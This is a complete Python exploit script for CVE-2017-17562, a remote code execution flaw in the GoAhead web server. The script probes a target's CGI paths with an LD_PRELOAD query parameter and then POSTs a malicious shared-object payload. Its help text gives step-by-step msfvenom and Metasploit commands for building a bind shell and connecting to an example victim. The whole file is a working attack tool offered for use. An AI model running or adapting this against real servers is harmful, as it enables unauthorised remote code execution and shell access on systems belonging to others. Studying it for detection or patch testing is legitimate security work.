#!/usr/bin/env python3

# Exploit Title: GoAhead Web Server 2.5 < 3.6.5 - HTTPd 'LD_PRELOAD' Remote Code Execution 
# Date: 12/12/2021
# Exploit Author: nu11pointer
# Vendor Homepage: https://www.embedthis.com
# Software Link: https://www.embedthis.com/goahead/
# Version: <3.6.5
# Tested on: Parrot OS 4, Ubuntu 20.04
# CVE : CVE-2017-17562

"""
CVE: CVE-2017-17562
Developed by: @nu11pointer (https://github.com/nu11pointer)
Source: https://github.com/nu11pointer/goahead-rce-exploit
Description: Exploit for CVE-2017-17562 vulnerability, that allows RCE on GoAhead (< v3.6.5) if the CGI is enabled and a CGI program is dynamically linked.
External Sources: Metasploit Exploit (directories list) and @ivanitlearning (basic exploit idea)
"""

import requests
import sys
import argparse

# Colors
RED = "\033[0;31m"
GREEN = "\033[1;32m"
BLUE = "\033[0;34m"
RESET = "\033[0m"

# Test if a GET request, to a given URL, returns status code 200
def test(URL):
	try:
		req = requests.get(URL)
		return True if req.status_code == 200 else False
	except requests.exceptions.ConnectionError:
		return False

# Exploit
def main(host, port, ssl, cgi, payload):
	# Automatically choose between https or http protocols
	if (port == "443" or ssl):
		proto = "https"
	else:
		proto = "http"

	exploitable = False
	exploitable_paths = []

	# Test connection to the given host
	if (not test(f"{proto}://{host}")):
		print(f"{RED}[!] Connection failed.{RESET}")
		return 1

	# If a CGI paths list wasn't given, or if the default list "paths.lst" was passed
	if (cgi == "paths.lst"):
		prefix_path = [
			'/',
			'/cgi-bin/',
			'/cgi/'
		]

		print("Wordlist: " + cgi)

		try:
			fp = open(cgi, "r")
			paths = fp.readlines()
			for prefix in prefix_path:
				for path in paths:
					full_path = prefix + path
					full_path = full_path.rstrip()
					if (port == "80" or port == "443"):
						URL = f"{proto}://{host}{full_path}?LD_PRELOAD=/proc/self/fd/0"
					else:
						URL = f"{proto}://{host}:{port}{full_path}?LD_PRELOAD=/proc/self/fd/0"

					# If the request returned status code 200
					if (test(URL)):
						exploitable = True
						exploitable_paths.append(full_path)
						print("[+] Exploitable Path: " + full_path)
			fp.close()
		except FileNotFoundError:
			print(f"{RED}[!] File \"{cgi}\" not found. Exiting...{RESET}")
			return 1
	else:
		try:
			fp = open(cgi, "r")
			paths = fp.readlines()
			for path in paths:
				path = path.rstrip()
				if (port == "80" or port == "443"):
					URL = f"{proto}://{host}/{path}?LD_PRELOAD=/proc/self/fd/0"
				else:
					URL = f"{proto}://{host}:{port}/{path}?LD_PRELOAD=/proc/self/fd/0"

				# If the request returned status code 200
				if (test(URL)):
					exploitable = True
					exploitable_paths.append('/' + path)
					print("[+] Exploitable Path: /" + path)
			fp.close()
		except FileNotFoundError:
			print(f"{RED}[!] File \"{cgi}\" not found.{RESET}")
			return 1

	# If an exploitable path was found
	if (exploitable):

		# Define User-Agent
		headers = { 
			"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0)",
		}

		# Send payload to the target
		try:
			fp = open(payload, "rb")
			print("Sending payload...")
			for p in exploitable_paths:
				if (port == "80" or port == "443"):
					URL = f"{proto}://{host}{p}?LD_PRELOAD=/proc/self/fd/0"
				else:
					URL = f"{proto}://{host}:{port}{p}?LD_PRELOAD=/proc/self/fd/0"
				req = requests.post(URL, data=fp.read(), headers=headers)
			print(f"{GREEN}[+] Payload sent successfully!{RESET}")
			fp.close()
			return 0
		except IOError:
			print(f"{RED}[!] File \"{payload}\" not found.{RESET}")
			return 1
		except requests.exceptions.ConnectionError:
			print(f"{RED}[!] Connection failed.{RESET}")
			return 1
	else:
		print(f"{RED}[!] No exploitable paths were found.{RESET}")

	return 1

# Init
if __name__ == '__main__':
	# Create the argument parser
	parser = argparse.ArgumentParser(
						description=f"Attention!\nYou need to generate the payload and set up the listening connection first.\nExample:\n(Attacker: 192.168.1.100 - Victim: 192.168.1.200)\n$ msfvenom -a x64 --platform Linux -p generic/shell_bind_tcp LHOST=192.168.1.100 LPORT=1337 -f elf-so -o payload.so\n$ msfconsole\nmsf6 > use multi/handler\nmsf6 exploit({RED}multi/handler{RESET}) > set payload generic/shell_bind_tcp\nmsf6 exploit({RED}multi/handler{RESET}) > set LPORT=1337\nmsf6 exploit({RED}multi/handler{RESET}) > set RHOST=192.168.1.200\nmsf6 exploit({RED}multi/handler{RESET}) > run\n{BLUE}[*]{RESET} Started bind TCP handler against 192.168.1.200:1337\n\nThen, in another shell, you must run this exploit to send the payload that will start the reverse connection to the listener!", 
						epilog="\n\nExample:\npython3 exploit.py --host 192.168.1.200 --port 8080 --cgi custom_list.txt --payload payload.so", 
						formatter_class=argparse.RawTextHelpFormatter
					)
	parser._action_groups.pop()
	required = parser.add_argument_group('Required arguments')
	optional = parser.add_argument_group('Optional arguments')
	required.add_argument("--host", help="Host running the GoAhead webserver.", required=True)
	required.add_argument("--port", help="Port running the GoAhead webserver. Default: 80", required=True, default=80)
	required.add_argument("--payload", help="Path to the payload.", required=True)
	optional.add_argument("--ssl", help="Host is using SSL.", action='store_true')
	optional.add_argument("--cgi", help="Paths list to discover the CGI script on the GoAhead server. Default: paths.lst", default="paths.lst")

	args = parser.parse_args()

	sys.exit(main(args.host, args.port, args.ssl, args.cgi, args.payload))
